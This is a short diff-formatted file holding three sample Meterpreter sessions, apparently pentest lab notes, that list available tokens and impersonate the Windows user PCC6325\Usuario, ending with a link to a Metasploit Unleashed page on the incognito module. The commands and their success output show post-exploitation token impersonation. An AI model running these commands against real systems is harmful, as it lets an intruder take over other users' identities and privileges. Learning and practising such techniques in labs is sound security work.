@@ -1,0 +1,38 @@
+[Sample #1]
+
+- meterpreter > list_tokens -u
+
+[-] Warning: Not currently running as SYSTEM, not all tokens will be available
+             Call rev2self if primary process token is SYSTEM
+
+Delegation Tokens Available
+========================================
+PCC6325\Usuario
+
+Impersonation Tokens Available
+========================================
+No tokens available
+
+[Sample #2]
+
+- meterpreter > impersonate_token PCC6325\\Usuario
+
+[-] Warning: Not currently running as SYSTEM, not all tokens will be available
+             Call rev2self if primary process token is SYSTEM
+[+] Delegation token available
+[+] Successfully impersonated user PCC6325\Usuario
+
+==========================================================
+
+[Sample #3]
+
+- meterpreter > impersonate_token PCC6325\\Usuario
+
+[-] Warning: Not currently running as SYSTEM, not all tokens will be available
+             Call rev2self if primary process token is SYSTEM
+[+] Delegation token available
+[+] Successfully impersonated user PCC6325\Usuario
+
+
+
+https://www.offensive-security.com/metasploit-unleashed/fun-incognito/
